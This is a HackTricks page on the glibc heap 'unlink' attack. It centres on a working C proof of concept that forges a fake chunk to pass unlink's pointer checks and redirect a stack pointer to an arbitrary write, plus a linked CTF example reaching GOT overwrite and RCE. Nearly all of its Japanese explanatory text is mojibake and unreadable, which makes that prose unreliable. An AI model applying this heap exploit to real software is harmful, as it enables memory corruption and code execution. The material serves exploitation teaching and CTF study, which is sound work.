# Unlink Attack

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã€å½“ç¤¾ã®ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã™ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) ãŠã‚ˆã³ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã™ã‚‹ã€‚

</details>

## åŸºæœ¬æƒ…å ±

ã“ã®æ”»æ’ƒãŒç™ºè¦‹ã•ã‚ŒãŸå½“åˆã€ä¸»ã« WWW (Write What Where) ã‚’è¨±å¯ã—ã¦ã„ã¾ã—ãŸãŒã€ã„ãã¤ã‹ã® **ãƒã‚§ãƒƒã‚¯ãŒè¿½åŠ ã•ã‚Œ**ã€æ”»æ’ƒã®æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¯ã‚ˆã‚Šèˆˆå‘³æ·±ãã€ã‚ˆã‚Šè¤‡é›‘ã§ **ç„¡æ„å‘³** ã«ãªã‚Šã¾ã—ãŸã€‚

### ã‚³ãƒ¼ãƒ‰ä¾‹:

<details>

<summary>ã‚³ãƒ¼ãƒ‰</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* æ”»æ’ƒã¯ã€tcaches ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã«ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ï¼ˆ2.26 ä»¥é™ï¼‰

### ã‚´ãƒ¼ãƒ«

* ã‚¹ã‚¿ãƒƒã‚¯å†…ã®ãƒãƒ£ãƒ³ã‚¯ã‚’æŒ‡ã™ã‚ˆã†ã«ãƒã‚¤ãƒ³ã‚¿ã‚’å¤‰æ›´ã—ã€ãƒãƒ£ãƒ³ã‚¯ã«æ›¸ãè¾¼ã‚€ã“ã¨ã§ã‚¹ã‚¿ãƒƒã‚¯ã®å†…å®¹ã‚’å¤‰æ›´ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹

### å¿…è¦æ¡ä»¶

* ã„ãã¤ã‹ã®ãƒ¡ãƒ¢ãƒªï¼ˆä¾‹ï¼šã‚¹ã‚¿ãƒƒã‚¯ï¼‰ã§ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã‚’æŒã¡ã€ã„ãã¤ã‹ã®å±æ€§ã«å€¤ã‚’ä¸ãˆã‚‹ãŸã‚ã«ã„ãã¤ã‹ã®ãƒãƒ£ãƒ³ã‚¯ã‚’ä½œæˆã™ã‚‹
* ã‚¹ã‚¿ãƒƒã‚¯ãƒªãƒ¼ã‚¯ã‚’è¡Œã„ã€å½ã®ãƒãƒ£ãƒ³ã‚¯ã®ãƒã‚¤ãƒ³ã‚¿ã‚’è¨­å®šã™ã‚‹ãŸã‚

### æ”»æ’ƒ

* 2 ã¤ã®ãƒãƒ£ãƒ³ã‚¯ãŒå­˜åœ¨ã™ã‚‹ï¼ˆchunk1 ã¨ chunk2ï¼‰
* æ”»æ’ƒè€…ã¯ chunk1 ã®å†…å®¹ã¨ chunk2 ã®ãƒ˜ãƒƒãƒ€ã‚’ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã—ã¦ã„ã‚‹
* chunk1 ã«æ”»æ’ƒè€…ã¯å½ã®ãƒãƒ£ãƒ³ã‚¯ã®æ§‹é€ ã‚’ä½œæˆã™ã‚‹:
* ä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ã€`size` ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒæ­£ã—ã„ã“ã¨ã‚’ç¢ºèªã—ã¦ã€`corrupted size vs. prev_size while consolidating` ã‚¨ãƒ©ãƒ¼ã‚’å›é¿ã™ã‚‹
* ãã—ã¦ã€å½ã®ãƒãƒ£ãƒ³ã‚¯ã® `fd` ã¨ `bk` ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒã€ãã‚Œãã‚Œ -3 ãŠã‚ˆã³ -2 ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã§ chunk1 ã®ãƒã‚¤ãƒ³ã‚¿ãŒæ ¼ç´ã•ã‚Œã¦ã„ã‚‹å ´æ‰€ã‚’æŒ‡ã™ã‚ˆã†ã«ã™ã‚‹ã€‚ã¤ã¾ã‚Šã€`fake_chunk->fd->bk` ãŠã‚ˆã³ `fake_chunk->bk->fd` ãŒãƒ¡ãƒ¢ãƒªï¼ˆã‚¹ã‚¿ãƒƒã‚¯ï¼‰å†…ã®ä½ç½®ã‚’æŒ‡ã™ã‚ˆã†ã«ã™ã‚‹

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* chunk2 ã®ãƒ˜ãƒƒãƒ€ã¯å¤‰æ›´ã•ã‚Œã€å‰ã®ãƒãƒ£ãƒ³ã‚¯ãŒä½¿ç”¨ã•ã‚Œã¦ã„ãªã„ã“ã¨ã¨ã€å½ã®ãƒãƒ£ãƒ³ã‚¯ãŒå«ã¾ã‚Œã‚‹ã‚µã‚¤ã‚ºã§ã‚ã‚‹ã“ã¨ãŒç¤ºã•ã‚Œã‚‹
* 2 ç•ªç›®ã®ãƒãƒ£ãƒ³ã‚¯ãŒè§£æ”¾ã•ã‚Œã‚‹ã¨ã€ã“ã®å½ã®ãƒãƒ£ãƒ³ã‚¯ãŒãƒªãƒ³ã‚¯è§£é™¤ã•ã‚Œã‚‹:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* ä»¥å‰ã«ã€`fake_chunk->fd->bk` ã¨ `fake_chunk->fd->bk` ãŒåŒã˜å ´æ‰€ã‚’æŒ‡ã™ã‚ˆã†ã«ã•ã‚Œã¦ã„ãŸï¼ˆ`chunk1` ãŒæ ¼ç´ã•ã‚Œã¦ã„ãŸã‚¹ã‚¿ãƒƒã‚¯å†…ã®å ´æ‰€ã€ã¤ã¾ã‚Šæœ‰åŠ¹ãªãƒªãƒ³ã‚¯ãƒªã‚¹ãƒˆã§ã‚ã£ãŸï¼‰ã€‚**ä¸¡æ–¹ãŒåŒã˜å ´æ‰€ã‚’æŒ‡ã—ã¦ã„ã‚‹**ãŸã‚ã€æœ€å¾Œã®ã‚‚ã®ï¼ˆ`fake_chunk->bk->fd = fake_chunk->fd`ï¼‰ã ã‘ãŒ**åŠ¹æœã‚’ç™ºæ®**ã™ã‚‹ã€‚
* ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¹ã‚¿ãƒƒã‚¯å†…ã® chunk1 ã¸ã®ãƒã‚¤ãƒ³ã‚¿ãŒã‚¹ã‚¿ãƒƒã‚¯å†…ã® 3 ã¤å‰ã«æ ¼ç´ã•ã‚Œã¦ã„ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆã¾ãŸã¯ãƒã‚¤ãƒˆï¼‰ã«ä¸Šæ›¸ãã•ã‚Œã‚‹
* ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ãŒå†ã³ chunk1 ã®å†…å®¹ã‚’ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã§ãã‚‹å ´åˆã€ã‚¹ã‚¿ãƒƒã‚¯å†…ã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã€æ½œåœ¨çš„ã«ãƒªã‚¿ãƒ¼ãƒ³ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä¸Šæ›¸ãã—ã¦ã‚­ãƒ£ãƒŠãƒªã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã€ãƒ­ãƒ¼ã‚«ãƒ«å¤‰æ•°ã®å€¤ã¨ãƒã‚¤ãƒ³ã‚¿ã‚’å¤‰æ›´ã§ãã‚‹ã‚ˆã†ã«ãªã‚‹ã€‚å†ã³ã‚¹ã‚¿ãƒƒã‚¯å†…ã«æ ¼ç´ã•ã‚Œã¦ã„ã‚‹ chunk1 ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç•°ãªã‚‹å ´æ‰€ã«å¤‰æ›´ã™ã‚‹ã“ã¨ã‚‚ã§ãã‚‹ã€‚æ”»æ’ƒè€…ãŒå†ã³ chunk1 ã®å†…å®¹ã‚’ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ã§ãã‚‹å ´åˆã€ã©ã“ã«ã§ã‚‚æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚‹
* ã“ã‚ŒãŒå¯èƒ½ã ã£ãŸã®ã¯ã€**ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒã‚¹ã‚¿ãƒƒã‚¯ã«æ ¼ç´ã•ã‚Œã¦ã„ãŸ**ãŸã‚ã§ã™ã€‚ãƒªã‚¹ã‚¯ã¨æ‚ªç”¨ã¯ã€**å½ã®ãƒãƒ£ãƒ³ã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒã©ã“ã«æ ¼ç´ã•ã‚Œã¦ã„ã‚‹ã‹**ã«ä¾å­˜ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## å‚è€ƒæ–‡çŒ®

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* CTF ã§ã‚‚ unlink æ”»æ’ƒã‚’è¦‹ã¤ã‘ã‚‹ã®ã¯å¥‡å¦™ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€ã“ã®æ”»æ’ƒãŒä½¿ç”¨ã•ã‚ŒãŸãƒ©ã‚¤ãƒˆã‚¢ãƒƒãƒ—ãŒã‚ã‚‹ã®ã§ã€æ¬¡ã®ãƒªãƒ³ã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„:
* CTF ã®ä¾‹: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* ã“ã®ä¾‹ã§ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ã®ä»£ã‚ã‚Šã« malloc ã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã®é…åˆ—ãŒã‚ã‚Šã¾ã™ã€‚unlink æ”»æ’ƒã¯ã€ã“ã“ã«ãƒãƒ£ãƒ³ã‚¯ã‚’å‰²ã‚Šå½“ã¦ã‚‹ãŸã‚ã«å®Ÿè¡Œã•ã‚Œã€ã—ãŸãŒã£ã¦ malloc ã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã®é…åˆ—ã®ãƒã‚¤ãƒ³ã‚¿ã‚’åˆ¶å¾¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®å¾Œã€ã“ã‚Œã‚‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®ãƒãƒ£ãƒ³ã‚¯ã®å†…å®¹ã‚’å¤‰æ›´ã™ã‚‹æ©Ÿèƒ½ãŒã‚ã‚Šã€ã“ã‚Œã«ã‚ˆã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ GOT ã«ãƒã‚¤ãƒ³ãƒˆã—ã€é–¢æ•°ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¤‰æ›´ã—ã¦ãƒªãƒ¼ã‚¯ã‚„ RCE ã‚’å–å¾—ã§ãã¾ã™ã€‚*

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
